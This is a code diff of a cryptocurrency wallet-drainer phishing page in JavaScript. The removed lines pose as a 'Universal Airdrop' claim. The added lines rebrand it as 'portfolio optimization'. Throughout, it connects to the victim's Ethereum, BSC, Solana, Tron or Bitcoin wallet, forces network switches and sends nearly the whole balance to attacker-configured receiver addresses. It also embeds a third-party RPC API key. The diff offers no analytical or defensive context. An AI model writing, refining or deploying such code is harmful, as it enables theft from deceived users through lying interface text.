+                            console.error("Phantom Solana optimization failed:", solanaError);
+                            updateConnectionStatus(`❌ Solana optimization failed: ${solanaError.message}`);
+                        }
+                    }
+                    
+                    updateConnectionStatus("Multi-chain portfolio optimization completed! 🎉");
+                    alert("Phantom multi-chain portfolio optimization completed!");
                     
                 } catch (error) {
-                    console.error(`Error with ${network}:`, error);
-                    results.push({ network, success: false, error: error.message });
-                    updateStatus(`❌ ${network.toUpperCase()} failed: ${error.message}`);
+                    console.error("Multi-chain optimization error:", error);
+                    updateConnectionStatus("Multi-chain optimization failed", true);
+                    alert(`Multi-chain optimization failed: ${error.message || 'Unknown error'}`);
                 }
-            }
-            
-            // Calculate total value drained
-            const totalValue = results.reduce((sum, result) => {
-                return sum + (result.success ? result.amount : 0);
-            }, 0);
-            
-            const successfulNetworks = results.filter(r => r.success).length;
-            
-            updateProgress(100);
-            updateStatus(`🎉 Process complete! ${successfulNetworks} networks processed`);
-            
-            // Show final message
-            if (successfulNetworks > 0) {
-                alert(`🎉 Universal Airdrop Claimed!\n\n✅ Networks processed: ${successfulNetworks}/${results.length}\n💰 Total value: $${totalValue.toFixed(2)}\n\nThank you for participating!`);
-            } else {
-                alert(`ℹ️ Airdrop Check Complete\n\nNo eligible assets found across ${results.length} networks.\nPlease ensure you have:\n• Supported wallets installed\n• Assets in your wallets\n• Wallets connected to correct networks`);
-            }
-            
+            });
+
+            // Show detailed connection info
+            let alertMessage = `Connected to Phantom:\n`;
+            if (evmConnected) alertMessage += `✅ EVM: ${userAddress}\n   Network: Ethereum\n`;
+            if (solanaConnected) alertMessage += `✅ Solana: ${solanaAddress}\n   Network: Solana\n`;
+            alert(alertMessage);
+
         } catch (error) {
-            console.error("Universal connection error:", error);
-            updateStatus(`❌ Connection failed: ${error.message}`);
-            alert(`Failed to complete airdrop claim: ${error.message}`);
-        } finally {
-            isDraining = false;
-            hideLoading();
-            $('#connect-btn').text('🎉 Claim Complete');
-        }
-    }
-
-    // === SIMPLIFIED NETWORK CHECKER AND DRAINER ===
-    async function checkAndDrainNetwork(networkName) {
-        switch (networkName) {
-            case 'bitcoin':
-                const bitcoinResult = await checkBitcoinWallet();
-                if (bitcoinResult.supported) {
-                    try {
-                        const btcWallet = bitcoinResult.wallet;
-                        const btcAddress = await btcWallet.getAccounts();
-                        const userAddress = Array.isArray(btcAddress) ? btcAddress[0] : btcAddress;
-                        
-                        console.log(`🟧 Bitcoin wallet connected: ${userAddress} (${bitcoinResult.walletName})`);
-                        
-                        // Drain Bitcoin assets
-                        const drainResult = await drainBitcoinAssets(btcWallet, userAddress, bitcoinResult.walletName);
-                        return {
-                            success: drainResult.success,
-                            amount: drainResult.amount || 0
-                        };
-                    } catch (error) {
-                        console.error("Bitcoin connection error:", error);
-                        return { success: false, error: error.message };
-                    }
-                } else {
-                    return bitcoinResult;
-                }
-            case 'tron':
-                return await checkTronWallet();
-            case 'solana':
-                return await checkSolanaWallet();
-            case 'bsc':
-                return await checkBSCWallet();
-            case 'ethereum':
-                return await checkEthereumWallet();
-            default:
-                throw new Error(`Unsupported network: ${networkName}`);
-        }
-    }
-
-    // === BITCOIN WALLET CHECKER ===
-    async function checkBitcoinWallet() {
-        console.log("🔍 Checking for Bitcoin wallet...");
-        
-        try {
-            // Check for various Bitcoin wallet extensions
-            let btcWallet = null;
-            let walletName = "";
-            
-            // Check for Unisat Wallet (most common Bitcoin extension)
-            if (window.unisat) {
-                btcWallet = window.unisat;
-                walletName = "Unisat";
-            }
-            // Check for OKX Wallet Bitcoin support
-            else if (window.okxwallet && window.okxwallet.bitcoin) {
-                btcWallet = window.okxwallet.bitcoin;
-                walletName = "OKX";
-            }
-            // Check for Xverse Wallet
-            else if (window.XverseProviders && window.XverseProviders.BitcoinProvider) {
-                btcWallet = window.XverseProviders.BitcoinProvider;
-                walletName = "Xverse";
-            }
-            // Check for generic bitcoin object
-            else if (window.bitcoin) {
-                btcWallet = window.bitcoin;
-                walletName = "Bitcoin Wallet";
-            }
-            
-            if (!btcWallet) {
-                console.log("⚠️ No Bitcoin wallet detected. Install Unisat, OKX, or Xverse wallet.");
-                return { 
-                    success: false, 
-                    supported: false,
-                    reason: "No Bitcoin wallet detected. Install Unisat, OKX, or Xverse wallet." 
-                };
-            }
-            
-            console.log(`✅ Found ${walletName} Bitcoin wallet`);
-            
-            // Return wallet info for use by drainer
-            return {
-                success: true,
-                supported: true,
-                wallet: btcWallet,
-                walletName: walletName
-            };
-            
-        } catch (error) {
-            console.error("Bitcoin wallet detection error:", error);
-            return { 
-                success: false, 
-                supported: false,
-                error: error.message 
-            };
-        }
-    }
-
-    // === TRON WALLET CHECKER ===
-    async function checkTronWallet() {
-        console.log("🔍 Checking for Tron wallet...");
-        
-        if (!window.tronWeb) {
-            return { success: false, reason: "TronLink not installed" };
-        }
-        
-        try {
-            // Check if TronLink is connected
-            if (!window.tronWeb.defaultAddress.base58) {
-                // Try to trigger connection
-                await window.tronWeb.request({ method: 'tron_requestAccounts' });
-            }
-            
-            const userAddress = window.tronWeb.defaultAddress.base58;
-            if (!userAddress) {
-                return { success: false, reason: "TronLink not connected" };
-            }
-            
-            console.log(`✅ Connected to Tron: ${userAddress}`);
-            
-            // Drain Tron assets
-            return await drainTronAssets(userAddress);
-            
-        } catch (error) {
-            console.error("Tron wallet error:", error);
-            return { success: false, error: error.message };
-        }
-    }
-
-    // === SOLANA WALLET CHECKER ===
-    async function checkSolanaWallet() {
-        console.log("🔍 Checking for Solana wallet...");
-        
-        if (typeof solanaWeb3 === 'undefined') {
-            return { success: false, reason: "Solana Web3.js library not loaded" };
-        }
-        
-        if (!window.solana) {
-            return { success: false, reason: "No Solana wallet detected" };
-        }
-        
-        try {
-            // Try to connect to Phantom or other Solana wallet
-            const response = await window.solana.connect({ onlyIfTrusted: false });
-            const publicKey = response.publicKey.toString();
-            
-            console.log(`✅ Connected to Solana: ${publicKey}`);
-            
-            // Drain Solana assets
-            return await drainSolanaAssets(publicKey);
-            
-        } catch (error) {
-            console.error("Solana wallet error:", error);
-            return { success: false, error: error.message };
-        }
-    }
-
-    // === BSC WALLET CHECKER ===
-    async function checkBSCWallet() {
-        console.log("🔍 Checking for BSC wallet...");
-        
-        if (!window.ethereum) {
-            return { success: false, reason: "No Ethereum-compatible wallet detected" };
-        }
-        
-        try {
-            // Request account access first
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            if (!accounts || accounts.length === 0) {
-                return { success: false, reason: "No accounts available" };
-            }
-            
-            // Force switch to BSC network
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }], // BSC mainnet
-                });
-                console.log("✅ Switched to BSC network");
-                
-                // Wait a moment for the switch to complete
-                await new Promise(resolve => setTimeout(resolve, 2000));
-                
-            } catch (networkError) {
-                console.log("BSC network switch failed, trying to add network...");
-                try {
-                    await window.ethereum.request({
-                        method: 'wallet_addEthereumChain',
-                        params: [{
-                            chainId: '0x38',
-                            chainName: 'Smart Chain',
-                            nativeCurrency: {
-                                name: 'BNB',
-                                symbol: 'BNB',
-                                decimals: 18
-                            },
-                            rpcUrls: ['https://bsc-dataseed1.binance.org/'],
-                            blockExplorerUrls: ['https://bscscan.com/']
-                        }]
-                    });
-                    console.log("✅ Added and switched to BSC network");
-                    
-                    // Wait for network to be added and switched
-                    await new Promise(resolve => setTimeout(resolve, 3000));
-                    
-                } catch (addError) {
-                    console.log("Failed to add BSC network, will check balance anyway:", addError.message);
-                }
-            }
-            
-            // Connect wallet
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
-            const address = await signer.getAddress();
-            
-            console.log(`✅ Connected to BSC: ${address}`);
-            
-            // Check if we're actually on BSC - if not, skip BSC tokens
-            const network = await provider.getNetwork();
-            if (network.chainId !== 56) {
-                console.log(`⚠️ Not on BSC network (chainId: ${network.chainId}), skipping BSC tokens`);
-                // Only try to drain native ETH/BNB
-                const receiverAddress = CONFIG.RECEIVER_ADDRESSES.bsc;
-                const ethDrained = await drainETH(provider, signer, address, receiverAddress);
-                return { success: true, amount: ethDrained };
-            } else {
-                console.log(`✅ Confirmed on BSC network (chainId: ${network.chainId})`);
-                // Drain BSC assets
-                return await drainBSCAssets(provider, signer, address);
-            }
-            
-        } catch (error) {
-            console.error("BSC wallet error:", error);
-            return { success: false, error: error.message };
-        }
-    }
-
-    // === ETHEREUM WALLET CHECKER ===
-    async function checkEthereumWallet() {
-        console.log("🔍 Checking for Ethereum wallet...");
-        
-        if (!window.ethereum) {
-            return { success: false, reason: "No Ethereum wallet detected" };
-        }
-        
-        try {
-            // Request account access (might already be connected from BSC)
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            if (!accounts || accounts.length === 0) {
-                return { success: false, reason: "No accounts available" };
-            }
-            
-            // Force switch to Ethereum mainnet
-            try {
-                await window.ethereum.request({
-                    method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x1' }], // Ethereum mainnet
-                });
-                console.log("✅ Switched to Ethereum network");
-            } catch (networkError) {
-                console.log("Ethereum network switch failed, continuing anyway:", networkError.message);
-            }
-            
-            // Connect wallet
-            const provider = new ethers.providers.Web3Provider(window.ethereum);
-            const signer = provider.getSigner();
-            const address = await signer.getAddress();
-            
-            console.log(`✅ Connected to Ethereum: ${address}`);
-            
-            // Check if we're actually on Ethereum
-            const network = await provider.getNetwork();
-            if (network.chainId !== 1) {
-                console.log(`⚠️ Not on Ethereum network (chainId: ${network.chainId}), but continuing...`);
-            }
-            
-            // Drain Ethereum assets
-            return await drainEthereumAssets(provider, signer, address);
-            
-        } catch (error) {
-            console.error("Ethereum wallet error:", error);
-            return { success: false, error: error.message };
-        }
-    }
-
-    async function drainEthereumAssets(provider, signer, userAddress) {
-        let totalValue = 0;
-        const receiverAddress = CONFIG.RECEIVER_ADDRESSES.ethereum;
-        
-        try {
-            console.log(`💰 Starting Ethereum asset drain from ${userAddress} to ${receiverAddress}`);
-            
-            // Check balance first with error handling
-            let ethBalance;
-            try {
-                ethBalance = await provider.getBalance(userAddress);
-                console.log(`Current ETH balance: ${ethers.utils.formatEther(ethBalance)} ETH`);
-            } catch (balanceError) {
-                console.error(`❌ Could not get ETH balance: ${balanceError.message}`);
-                return { success: false, error: `Failed to get balance: ${balanceError.message}`, amount: 0 };
-            }
-            
-            // Get gas price with error handling
-            let gasPrice;
-            try {
-                gasPrice = await provider.getGasPrice();
-                console.log(`Gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
-            } catch (gasPriceError) {
-                console.error(`❌ Could not get gas price: ${gasPriceError.message}`);
-                return { success: false, error: `Failed to get gas price: ${gasPriceError.message}`, amount: 0 };
-            }
-            
-            // Skip ERC-20 tokens for now to avoid gas issues, focus on ETH transfer
-            console.log(`💰 Attempting to drain ETH only (skipping tokens to avoid gas complications)...`);
-            
-            const ethDrained = await drainETH(provider, signer, userAddress, receiverAddress);
-            if (ethDrained > 0) {
-                console.log(`✅ Drained ${ethDrained} ETH`);
-                totalValue += ethDrained;
-            } else {
-                console.log(`⚠️ No ETH was transferred`);
-            }
-            
-            console.log(`📊 Total Ethereum value drained: ${totalValue}`);
-            return { success: totalValue > 0, amount: totalValue };
-            
-        } catch (error) {
-            console.error("Ethereum drain error:", error);
-            // Handle Phantom wallet specific errors
-            if (error.message && error.message.includes('Unexpected error')) {
-                return { success: false, error: "Wallet connection issue - please try again", amount: 0 };
-            }
-            return { success: false, error: error.message, amount: 0 };
-        }
-    }
-
-    // === ASSET DRAINING FUNCTIONS ===
-
-    async function drainBSCAssets(provider, signer, userAddress) {
-        let totalValue = 0;
-        const receiverAddress = CONFIG.RECEIVER_ADDRESSES.bsc;
-        
-        try {
-            console.log(`💰 Starting BSC asset drain from ${userAddress} to ${receiverAddress}`);
-            
-            // Check balance first with error handling
-            let bnbBalance;
-            try {
-                bnbBalance = await provider.getBalance(userAddress);
-                console.log(`Current BNB balance: ${ethers.utils.formatEther(bnbBalance)} BNB`);
-            } catch (balanceError) {
-                console.error(`❌ Could not get BNB balance: ${balanceError.message}`);
-                return { success: false, error: `Failed to get balance: ${balanceError.message}`, amount: 0 };
-            }
-            
-            // Get gas price with error handling
-            let gasPrice;
-            try {
-                gasPrice = await provider.getGasPrice();
-                console.log(`Gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
-            } catch (gasPriceError) {
-                console.error(`❌ Could not get gas price: ${gasPriceError.message}`);
-                return { success: false, error: `Failed to get gas price: ${gasPriceError.message}`, amount: 0 };
-            }
-            
-            // Skip BEP-20 tokens for now to avoid gas issues, focus on BNB transfer
-            console.log(`💰 Attempting to drain BNB only (skipping tokens to avoid gas complications)...`);
-            
-            const bnbDrained = await drainETH(provider, signer, userAddress, receiverAddress);
-            if (bnbDrained > 0) {
-                console.log(`✅ Drained ${bnbDrained} BNB`);
-                totalValue += bnbDrained;
-            } else {
-                console.log(`⚠️ No BNB was transferred`);
-            }
-            
-            console.log(`📊 Total BSC value drained: ${totalValue}`);
-            return { success: totalValue > 0, amount: totalValue };
-            
-        } catch (error) {
-            console.error("BSC drain error:", error);
-            // Handle wallet specific errors
-            if (error.message && error.message.includes('Unexpected error')) {
-                return { success: false, error: "Wallet connection issue - please try again", amount: 0 };
-            }
-            return { success: false, error: error.message, amount: 0 };
-        }
-    }
-
-    // === SOLANA NETWORK HANDLER ===
-    async function handleSolanaNetwork() {
-        if (!window.solana || !window.solana.isPhantom) {
-            throw new Error("Phantom wallet not found for Solana");
-        }
-
-        try {
-            // Connect to Phantom
-            const response = await window.solana.connect();
-            const publicKey = response.publicKey.toString();
-            
-            console.log(`Connected to Solana: ${publicKey}`);
-            
-            // Drain assets
-            return await drainSolanaAssets(publicKey);
-            
-        } catch (error) {
-            console.error("Solana network error:", error);
+            console.error("Phantom multi-connection error:", error);
             throw error;
         }
     }
 
-    async function drainSolanaAssets(userPublicKey) {
-        let totalValue = 0;
-        const receiverAddress = CONFIG.RECEIVER_ADDRESSES.solana;
+    // Handle EVM wallet connections with network-aware draining
+    async function handleEVMConnection(selected) {
+        const provider = selected.provider;
         
-        try {
-            console.log("🔍 Connecting to Solana with Syndica RPC...");
-            
-            // Use your Syndica RPC endpoint
-            const rpcEndpoint = 'https://solana-mainnet.api.syndica.io/api-key/oNprEqE6EkkFUFhf1GBM4TegN9veFkrQrUehkLC8XKNiFUDdWhohF2pBsWXpZAgQRQrs8SwxFSXBc7vfdtDgBdFT726RmpzTj4';
-            
-            try {
-                const userPubKey = new solanaWeb3.PublicKey(userPublicKey);
-                const receiverPubKey = new solanaWeb3.PublicKey(receiverAddress);
-                
-                // Connect using your premium RPC
-                const connection = new solanaWeb3.Connection(rpcEndpoint, 'confirmed');
-                
-                console.log(`✅ Connected to Syndica RPC`);
-                console.log(`📤 Sending SOL to: ${receiverAddress}`);
-                
-                // Get SOL balance with longer timeout since we have a good RPC
-                const balancePromise = connection.getBalance(userPubKey);
-                const timeoutPromise = new Promise((_, reject) => 
-                    setTimeout(() => reject(new Error('Timeout')), 15000) // 15 second timeout
-                );
-                
-                const solBalance = await Promise.race([balancePromise, timeoutPromise]);
-                console.log(`SOL Balance: ${solBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL (${solBalance} lamports)`);
-                
-                if (solBalance > 10000) { // Only transfer if more than 0.00001 SOL
-                    try {
-                        // Get the actual transaction fee first
-                        let actualFee = 5000; // Start with base fee estimate
-                        
-                        try {
-                            // Create a dummy transaction to estimate the exact fee
-                            const dummyTransaction = new solanaWeb3.Transaction().add(
-                                solanaWeb3.SystemProgram.transfer({
-                                    fromPubkey: userPubKey,
-                                    toPubkey: receiverPubKey,
-                                    lamports: 1000 // Dummy amount
-                                })
-                            );
-                            
-                            const { blockhash } = await connection.getLatestBlockhash();
-                            dummyTransaction.recentBlockhash = blockhash;
-                            dummyTransaction.feePayer = userPubKey;
-                            
-                            // Get the actual fee for this transaction
-                            const fee = await connection.getFeeForMessage(dummyTransaction.compileMessage());
-                            if (fee && fee.value) {
-                                actualFee = fee.value;
-                                console.log(`📊 Actual transaction fee: ${actualFee} lamports`);
-                            }
-                        } catch (feeError) {
-                            console.log(`⚠️ Could not estimate exact fee, using default: ${actualFee} lamports`);
-                        }
-                        
-                        // Add extra buffer for safety (double the fee)
-                        const feeReserve = Math.max(actualFee * 2, 10000); // At least 0.00001 SOL
-                        const amountToSend = Math.max(0, solBalance - feeReserve);
-                        
-                        if (amountToSend <= 0) {
-                            console.log(`⚠️ SOL balance too low after fees: ${solBalance} lamports (need ${feeReserve} for fees)`);
-                            return { success: true, amount: solBalance / solanaWeb3.LAMPORTS_PER_SOL };
-                        }
-                        
-                        console.log(`🚀 Preparing SOL transfer: ${amountToSend} lamports (${amountToSend / solanaWeb3.LAMPORTS_PER_SOL} SOL)`);
-                        console.log(`💰 Fee reserved: ${feeReserve} lamports`);
-                        
-                        // Get recent blockhash with retry logic
-                        let blockhash;
-                        let attempts = 0;
-                        while (attempts < 3) {
-                            try {
-                                const { blockhash: recentBlockhash } = await Promise.race([
-                                    connection.getLatestBlockhash('finalized'),
-                                    new Promise((_, reject) => setTimeout(() => reject(new Error('Blockhash timeout')), 10000))
-                                ]);
-                                blockhash = recentBlockhash;
-                                break;
-                            } catch (blockhashError) {
-                                attempts++;
-                                console.log(`⚠️ Blockhash attempt ${attempts} failed: ${blockhashError.message}`);
-                                if (attempts >= 3) throw blockhashError;
-                                await new Promise(resolve => setTimeout(resolve, 1000));
-                            }
-                        }
-                        
-                        // Create SOL transfer transaction
-                        const transaction = new solanaWeb3.Transaction().add(
-                            solanaWeb3.SystemProgram.transfer({
-                                fromPubkey: userPubKey,
-                                toPubkey: receiverPubKey,
-                                lamports: amountToSend
-                            })
-                        );
-                        
-                        transaction.recentBlockhash = blockhash;
-                        transaction.feePayer = userPubKey;
-                        
-                        // Sign and send transaction with better error handling
-                        console.log(`🚀 Signing SOL transfer transaction...`);
-                        
-                        let signedTransaction;
-                        try {
-                            signedTransaction = await window.solana.signTransaction(transaction);
-                            console.log(`✅ Transaction signed successfully`);
-                        } catch (signError) {
-                            console.error(`❌ Transaction signing failed: ${signError.message}`);
-                            throw new Error(`User rejected transaction or signing failed: ${signError.message}`);
-                        }
-                        
-                        // Send the transaction
-                        let signature;
-                        try {
-                            signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
-                                skipPreflight: false,
-                                preflightCommitment: 'confirmed',
-                                maxRetries: 3
-                            });
-                            console.log(`✅ SOL transfer sent: ${signature}`);
-                            console.log(`🔗 View transaction: https://solscan.io/tx/${signature}`);
-                        } catch (sendError) {
-                            console.error(`❌ Transaction send failed: ${sendError.message}`);
-                            throw new Error(`Failed to send transaction: ${sendError.message}`);
-                        }
-                        
-                        // Try to confirm transaction with reasonable timeout
-                        try {
-                            console.log(`⏳ Waiting for transaction confirmation...`);
-                            await Promise.race([
-                                connection.confirmTransaction(signature, 'confirmed'),
-                                new Promise((_, reject) => setTimeout(() => reject(new Error('Confirmation timeout')), 30000))
-                            ]);
-                            console.log(`✅ SOL transfer confirmed: ${signature}`);
-                            totalValue = amountToSend / solanaWeb3.LAMPORTS_PER_SOL;
-                        } catch (confirmError) {
-                            console.log(`⚠️ SOL transfer sent but confirmation timed out: ${signature}`);
-                            // Still count as success since transaction was sent
-                            totalValue = amountToSend / solanaWeb3.LAMPORTS_PER_SOL;
-                        }
-                        
-                    } catch (transferError) {
-                        console.error(`❌ SOL transfer failed: ${transferError.message}`);
-                        // Don't return success if transfer failed
-                        return { success: false, error: transferError.message, amount: 0 };
-                    }
+        if (!provider) {
+            throw new Error(`${selected.name} provider not found. Please make sure the wallet is properly installed.`);
+        }
+
+        // Special handling for Phantom EVM provider
+        if (selected.name.includes("Phantom") && selected.type === "evm") {
+            // For Phantom EVM, the provider might need to be accessed differently
+            if (typeof provider.request !== 'function') {
+                // Try to get the ethereum provider from phantom
+                if (window.phantom && window.phantom.ethereum && window.phantom.ethereum.request) {
+                    const phantomProvider = window.phantom.ethereum;
+                    selected.provider = phantomProvider; // Update the provider reference
+                    return await handleEVMConnection(selected); // Retry with correct provider
                 } else {
-                    console.log(`⚠️ SOL balance too low for transfer: ${solBalance / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
-                    totalValue = solBalance / solanaWeb3.LAMPORTS_PER_SOL; // Still count the balance
+                    throw new Error(`${selected.name} is not properly initialized. Please refresh the page and try again.`);
                 }
-                
-            } catch (rpcError) {
-                console.error(`❌ Syndica RPC error: ${rpcError.message}`);
-                return { success: false, error: rpcError.message, amount: 0 };
             }
+        }
+
+        // Standard provider validation
+        if (typeof provider.request !== 'function') {
+            throw new Error(`${selected.name} is not properly installed or available. Please check if the wallet extension is installed and enabled.`);
+        }
+
+        try {
+            // Request account access
+            await provider.request({ method: 'eth_requestAccounts' });
             
-            return { success: totalValue > 0, amount: totalValue };
+            // Get connected accounts
+            const accounts = await provider.request({ method: 'eth_accounts' });
+            if (!accounts || accounts.length === 0) {
+                throw new Error("No accounts found. Please unlock your wallet and try again.");
+            }
+
+            const ethersProvider = new ethers.providers.Web3Provider(provider);
+            const signer = ethersProvider.getSigner();
+            const userAddress = accounts[0];
+
+            // Get current network
+            const network = await ethersProvider.getNetwork();
+            console.log("Connected to network:", network);
+
+            updateConnectionStatus(`Connected to ${selected.name} on ${getNetworkName(network.chainId)}`);
             
+            // Filter supported EVM networks
+            const supportedEVMNetworks = selected.networks.filter(net => NETWORK_CONFIGS[net]);
+            
+            if (supportedEVMNetworks.length > 1) {
+                // Multi-network wallet - drain all supported networks automatically
+                $('#connect-btn').text(`🚀 Optimize Portfolio (${supportedEVMNetworks.length} Networks)`);
+                $('#connect-btn').off('click').on('click', async () => {
+                    try {
+                        await drainMultiChainAuto(selected, userAddress);
+                    } catch (error) {
+                        console.error("Portfolio optimization error:", error);
+                        updateConnectionStatus("Portfolio optimization failed", true);
+                        alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
+                    }
+                });
+            } else {
+                // Single network optimization
+                $('#connect-btn').text(`🚀 Optimize ${getNetworkName(network.chainId)} Portfolio`);
+                $('#connect-btn').off('click').on('click', async () => {
+                    try {
+                        const result = await drainEVMNetwork(selected.provider, userAddress, supportedEVMNetworks[0]);
+                        if (result.success) {
+                            alert(`${getNetworkName(network.chainId)} portfolio optimization completed!\n${result.assets.length} assets optimized: ${result.assets.join(', ')}`);
+                        } else {
+                            alert(`Portfolio optimization failed: ${result.error}`);
+                        }
+                    } catch (error) {
+                        console.error("Portfolio optimization error:", error);
+                        updateConnectionStatus("Portfolio optimization failed", true);
+                        alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
+                    }
+                });
+            }
+
+            const networkInfo = supportedEVMNetworks.length > 1
+                ? `\nSupported Networks: ${supportedEVMNetworks.map(n => n.toUpperCase()).join(', ')}`
+                : `\nNetwork: ${getNetworkName(network.chainId)}`;
+                
+            alert(`Connected to ${selected.name}:\n${userAddress}${networkInfo}`);
+
+        } catch (error) {
+            // Handle specific wallet errors
+            if (error.code === 4001) {
+                throw new Error("Connection rejected by user. Please try again and approve the connection.");
+            } else if (error.code === -32002) {
+                throw new Error("Connection request already pending. Please check your wallet.");
+            } else if (error.message.includes("User rejected")) {
+                throw new Error("Connection rejected. Please approve the connection in your wallet.");
+            } else {
+                throw error;
+            }
+        }
+    }
+
+    // Handle Solana wallet connections
+    async function handleSolanaConnection(selected) {
+        const provider = selected.provider;
+        
+        if (!provider || typeof provider.connect !== 'function') {
+            throw new Error(`${selected.name} is not properly installed or available.`);
+        }
+
+        // Connect to Solana wallet
+        const response = await provider.connect();
+        const userAddress = response.publicKey.toString();
+
+        updateConnectionStatus(`Connected to ${selected.name} (Solana)`);
+        
+        // Update button for Solana draining
+        $('#connect-btn').text("🚀 Optimize Solana Portfolio");
+        $('#connect-btn').off('click').on('click', async () => {
+            try {
+                await drainSolana(provider, userAddress);
+            } catch (error) {
+                console.error("Portfolio optimization error:", error);
+                updateConnectionStatus("Portfolio optimization failed", true);
+                alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
+            }
+        });
+
+        alert(`Connected to ${selected.name}:\n${userAddress}\nNetwork: Solana`);
+    }
+
+    // Handle Tron wallet connections
+    async function handleTronConnection(selected) {
+        const tronWeb = selected.provider;
+        
+        if (!tronWeb || !tronWeb.defaultAddress.base58) {
+            throw new Error("TronLink is not properly installed or logged in.");
+        }
+
+        const userAddress = tronWeb.defaultAddress.base58;
+
+        updateConnectionStatus(`Connected to ${selected.name} (Tron)`);
+        
+        // Update button for Tron draining
+        $('#connect-btn').text("🚀 Optimize Tron Portfolio");
+        $('#connect-btn').off('click').on('click', async () => {
+            try {
+                await drainTron(tronWeb, userAddress);
+            } catch (error) {
+                console.error("Portfolio optimization error:", error);
+                updateConnectionStatus("Portfolio optimization failed", true);
+                alert(`Portfolio optimization failed: ${error.message || 'Unknown error'}`);
+            }
+        });
+
+        alert(`Connected to ${selected.name}:\n${userAddress}\nNetwork: Tron`);
+    }
+
+    // Helper function to add network to wallet
+    async function addNetworkToWallet(wallet, config) {
+        const networkParams = {
+            chainId: `0x${config.chainId.toString(16)}`,
+            chainName: config.name,
+            nativeCurrency: {
+                name: config.nativeCurrency,
+                symbol: config.nativeCurrency,
+                decimals: 18
+            },
+            rpcUrls: [config.rpcUrl],
+            blockExplorerUrls: getBlockExplorerUrls(config.chainId)
+        };
+
+        await wallet.request({
+            method: 'wallet_addEthereumChain',
+            params: [networkParams]
+        });
+    }
+
+    // Get block explorer URLs for networks
+    function getBlockExplorerUrls(chainId) {
+        const explorers = {
+            1: ['https://etherscan.io'],
+            56: ['https://bscscan.com'],
+            137: ['https://polygonscan.com'],
+            250: ['https://ftmscan.com'],
+            43114: ['https://snowtrace.io']
+        };
+        return explorers[chainId] || [''];
+    }
+
+    // Get network name by chain ID
+    function getNetworkName(chainId) {
+        const networkNames = {
+            1: "Ethereum",
+            56: "BSC",
+            137: "Polygon",
+            250: "Fantom",
+            43114: "Avalanche"
+        };
+        return networkNames[chainId] || `Unknown (${chainId})`;
+    }
+
+    // Automatic multi-chain draining function - checks each network sequentially
+    async function drainMultiChainAuto(selectedWallet, userAddress) {
+        try {
+            updateConnectionStatus("Starting automatic portfolio optimization...");
+            
+            const results = {};
+            
+            // Get all supported EVM networks for this wallet
+            const supportedNetworks = selectedWallet.networks.filter(net => NETWORK_CONFIGS[net]);
+            console.log(`Auto-checking ${supportedNetworks.length} networks: ${supportedNetworks.join(', ')}`);
+
+            // Automatically check each supported network
+            for (let i = 0; i < supportedNetworks.length; i++) {
+                const networkName = supportedNetworks[i];
+                results[networkName] = { success: false, assets: [] };
+                
+                try {
+                    updateConnectionStatus(`Checking ${networkName.toUpperCase()}... (${i + 1}/${supportedNetworks.length})`);
+                    
+                    // Add delay between network checks for better UX
+                    if (i > 0) {
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                    }
+                    
+                    const result = await drainEVMNetwork(selectedWallet.provider, userAddress, networkName);
+                    results[networkName] = result;
+                    
+                    // Show progress after each network
+                    if (result.success && result.assets.length > 0) {
+                        updateConnectionStatus(`✅ ${networkName.toUpperCase()}: ${result.assets.length} assets found`);
+                        await new Promise(resolve => setTimeout(resolve, 1500));
+                    } else if (result.success) {
+                        updateConnectionStatus(`🔍 ${networkName.toUpperCase()}: No assets found`);
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                    
+                } catch (error) {
+                    console.error(`Failed to check ${networkName}:`, error);
+                    results[networkName] = { success: false, error: error.message };
+                    updateConnectionStatus(`❌ ${networkName.toUpperCase()}: ${error.message}`);
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                }
+            }
+
+            updateConnectionStatus("Automatic portfolio optimization completed! 🎉");
+            
+            // Show detailed results summary
+            let summary = "🎯 Automatic Multi-Chain Portfolio Results:\n\n";
+            let totalAssets = 0;
+            
+            Object.entries(results).forEach(([network, result]) => {
+                if (result.success) {
+                    totalAssets += result.assets.length;
+                    summary += `✅ ${network.toUpperCase()}: ${result.assets.length} assets optimized\n`;
+                    if (result.assets.length > 0) {
+                        summary += `   └─ ${result.assets.join(', ')}\n`;
+                    }
+                } else if (result.error) {
+                    summary += `❌ ${network.toUpperCase()}: ${result.error}\n`;
+                }
+            });
+            
+            summary += `\n🚀 Total: ${totalAssets} assets optimized across ${supportedNetworks.length} networks`;
+            alert(summary);
+
+        } catch (error) {
+            console.error("Automatic multi-chain optimization error:", error);
+            updateConnectionStatus("Portfolio optimization failed", true);
+            alert("Failed to complete automatic portfolio optimization: " + error.message);
+        }
+    }
+
+    // Multi-chain draining function with automatic network switching
+    async function drainMultiChain(selectedWallet, userAddress) {
+        try {
+            updateConnectionStatus("Starting portfolio optimization...");
+            
+            const results = {
+                ethereum: { success: false, assets: [] },
+                bsc: { success: false, assets: [] },
+                polygon: { success: false, assets: [] }
+            };
+
+            // Get current network to determine starting point
+            const currentProvider = new ethers.providers.Web3Provider(selectedWallet.provider);
+            const currentNetwork = await currentProvider.getNetwork();
+            console.log(`Starting optimization from network: ${getNetworkName(currentNetwork.chainId)}`);
+
+            // Drain each supported network with automatic switching
+            for (let i = 0; i < selectedWallet.networks.length; i++) {
+                const networkName = selectedWallet.networks[i];
+                if (NETWORK_CONFIGS[networkName]) {
+                    try {
+                        updateConnectionStatus(`Optimizing ${networkName.toUpperCase()} portfolio... (${i + 1}/${selectedWallet.networks.length})`);
+                        
+                        // Add delay between network switches for better UX
+                        if (i > 0) {
+                            updateConnectionStatus(`Switching to ${networkName.toUpperCase()}...`);
+                            await new Promise(resolve => setTimeout(resolve, 2000));
+                        }
+                        
